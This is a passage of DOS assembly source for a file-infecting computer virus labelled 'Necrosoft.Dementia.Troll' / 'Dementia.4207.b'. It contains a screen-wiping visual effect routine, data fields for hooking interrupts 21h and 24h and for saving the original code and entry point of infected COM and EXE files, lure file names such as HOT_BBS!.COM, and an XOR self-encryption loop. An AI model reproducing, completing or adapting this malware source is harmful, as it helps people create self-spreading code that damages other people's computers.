            db      90h,20h,0a0h,20h,0ffh,06h,0e3h,03h,0ffh,07h,9fh,00h,0dch
            db      86h,0dch,86h,0ffh,39h,0a8h,03h,90h,20h,0ffh,0bh,31h,04h
            db      0dbh,81h,0ffh,05h,3eh,04h,86h,0dbh,86h,0ffh,39h,48h,04h
            db      96h,0ffh,05h,80h,04h,0fh,0dbh,90h,0dbh,90h,0dbh,90h,0ffh
            db      41h,8eh,04h,0e0h,0ffh,05h,0ceh,04h,0ffh,05h,09h,05h,0ffh
            db      06h,0e6h,02h,0ffh,0feh,0e0h,04h,0ffh,0ceh,0e0h,04h,50h
            db      08h,72h,08h,65h,08h,73h,08h,73h,08h,20h,08h,61h,08h,6eh
            db      08h,79h,08h,20h,08h,6bh,08h,65h,08h,79h,08h,0ffh,1ah,0e0h
            db      04h
   gfx_end:
   cls_effect   proc    near        ; Clear screen effect
            push    ax bx cx dx si di ss sp

            mov     ax,0b800h       ; AX = segment of text video RAM
            mov     es,ax       ; ES =    "    "   "     "    "

            mov     word ptr ds:[(count-file_begin+100h)],0ch
            mov     word ptr ds:[(count_-file_begin+100h)],0d0h
   reset_count:
            mov     ax,word ptr ds:[(count_-file_begin+100h)]
            mov     word ptr ds:[(count__-file_begin+100h)],ax
   reset_regs:
            mov     word ptr ds:[(row_count-file_begin+100h)],13h
            mov     word ptr ds:[(column_count-file_begin+100h)],01h

            mov     di,3d8h         ; DI = offset of lower left corner...

            mov     ax,word ptr ds:[(count-file_begin+100h)]
            mov     word ptr ds:[(count___-file_begin+100h)],ax
   reset_cx:
            mov     cx,word ptr ds:[(row_count-file_begin+100h)]
            dec     cx          ; Decrease row counter

            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,di       ; SI = offset within segment of te...
            add     si,02h      ; Add two to the index register

            cld             ; Clear direction flag
            rep     movsw       ; Move two byte to the right
            pop     ds          ; Load DS from stack

            mov     cx,word ptr ds:[(column_count-file_begin+100h)]

            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,di       ; SI = offset within segment of te...
            sub     si,50h      ; Subtract eighty from the index r...
            mov     ax,52h      ; Subtract eigty-two from both reg...

            cld             ; Clear direction flag
   move_up:
            movsw           ; Move two bytes a column up

            sub     di,ax       ; Subtract eighty-two from the ind...
            sub     si,ax       ;    "         "       "    "    "

            loop    move_up
            pop     ds          ; Load DS from stack

            mov     cx,word ptr ds:[(row_count-file_begin+100h)]

            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,di       ; SI = offset within segment of te...
            sub     si,02h      ; Subtract two from the index regi...

            std             ; Set direction flag
            rep     movsw       ; Move two bytes to the left
            pop     ds          ; Load DS from stack

            mov     cx,word ptr ds:[(column_count-file_begin+100h)]
            inc     cx          ; Increase column counter

            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,di       ; SI = offset within segment of te...
            add     si,50h      ; Add eighty to the index register
            mov     ax,52h      ; Add eighty-two to both index reg...

            std             ; Set direction flag
   move_down:
            movsw           ; Move two bytes a column down

            add     di,ax       ; Add eighty-two to the index regi...
            add     si,ax       ;  "      "      "   "    "      "

            loop    move_down
            pop     ds          ; Load DS from stack

            add     word ptr ds:[(row_count-file_begin+100h)],02h
            add     word ptr ds:[(column_count-file_begin+100h)],02h

            dec     word ptr ds:[(count___-file_begin+100h)]
            jnz     reset_cx        ; Not zero? Jump to reset_cx

            dec     word ptr ds:[(count__-file_begin+100h)]
            jz      sub_count_      ; Zero? Jump to sub_count_

            jmp     reset_regs
   sub_count_:
            sub     word ptr ds:[(count_-file_begin+100h)],08h

            dec     word ptr ds:[(count-file_begin+100h)]
            jz      cls_exit        ; Zero? Jump to cls_exit

            jmp     reset_count
   cls_exit:
            pop     sp ss di si dx cx bx ax

            ret             ; Return!
            endp

   count___     dw      00h         ; Counter
   count_       dw      00h         ; Counter
   count__      dw      00h         ; Counter
   row_count    dw      00h         ; Row counter
   column_count dw      00h         ; Column counter
   count        dw      00h         ; Counter
   crypt_end_:
   file_end:
   temp_file    db      '!#TEMP#!',00h      ; Temporary file
   request_iva  db      'REQUEST.IVA',00h   ; REQUEST.IVA
   filename     db      0dh dup(?)      ; Filename
   receipt_iva  db      'RECEIPT.IVA ',00h  ; RECEIPT.IVA
   hot_bbs__com db      'HOT_BBS!.COM',00h  ; HOT_BBS!.COM
   file_specifi db      '*.*',00h           ; File specification
   origin_code  db      0cdh,21h,?      ; Original code of infected COM file
   int21_addr   dd      ?           ; Address of interrupt 21h
   int24_addr   dd      ?           ; Address of interrupt 24h
   com_or_exe   db      00h         ; COM or EXE executable
   stack_ptr    dw      ?           ; Original stack pointer
   stack_seg    dw      ?           ; Original stack segment
   instruct_ptr dw      ?           ; Original instruction pointer
   code_seg     dw      ?           ; Original code segment
   initial_ip   dw      ?           ; Initial IP
   initial_cs   dw      ?           ; Initial CS relative to start of ...
   code_seg_    dw      ?           ; Code segment
   tst_filesize dw      00h         ; Test or don't test filesize
            db      '[Necrosoft.Dementia.Troll]',00h,0dh,0ah
            db      'Copyright 1994 Necrosoft enterprises -  All rights reserved',00h,0dh,0ah
            db      'I knew all along that she was the one, ',0dh,0ah
            db      '  but I hid it down deep inside.       ',0dh,0ah
            db      'I couldn''t bring myself to tell her,   ',0dh,0ah
            db      '  no matter how I tried.               ',0dh,0ah,00h
            db      16h dup(00h)
   crypt_begin:
   code_end:
   data_end:
   prepare_demt proc    near        ; Prepare Dementia.4207.b
            lea     di,crypt_begin_+100h
            mov     cx,(crypt_end_-crypt_begin_)/02h
   encrypt_loo_:
            xor     [di],1995h      ; Encrypt two bytes
            inc     di          ; Increase index register
            inc     di          ;    "       "      "
            loop    encrypt_loo_

            mov     [call_imm16+100h],cx

            jmp     delta_offset
            endp

   end      code_begin
